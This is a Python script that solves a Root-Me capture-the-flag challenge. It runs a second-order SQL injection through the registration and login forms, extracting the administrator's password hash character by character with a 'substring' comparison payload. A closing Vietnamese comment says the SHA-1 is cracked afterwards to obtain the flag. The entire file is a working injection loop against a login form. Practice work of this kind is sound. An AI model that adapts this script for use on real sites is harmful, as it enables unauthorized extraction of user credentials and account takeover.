import requests
import re
session = requests.Session()

url_create = "http://challenge01.root-me.org:59086/login_create.php"
url_login = "http://challenge01.root-me.org:59086/login.php"

chars = "1234567890qwertyuioplkjhgfdsazxcvbnm"
passwd=""
break_flag = False
i=1
while not break_flag :
    l1=len(passwd)
    print(f"Index {i}: ",end='',flush=True)
    for c in chars:
        payload = f"administrator'&&substring(password,{i},1)='{c}"
        data_create = {
            "username": payload,
            "email": "1",
            "password": "1",
            "re_password": "1",
            "submit": "Register"
        }
        data_login = {
            "user": payload,
            "password": "1",
            "submit": "Login"
        }

        r1 = requests.post(url_create,data=data_create)
        r2 = requests.post(url_login,data=data_login)
        if re.search(r'admin@', r2.text, re.IGNORECASE): 
            passwd= passwd + c
            print(passwd)           
            break
    i=i+1
    if l1 == len(passwd): break_flag=True
print("data: ",passwd)
# Tự decrypt SHA-1 ra Flag 


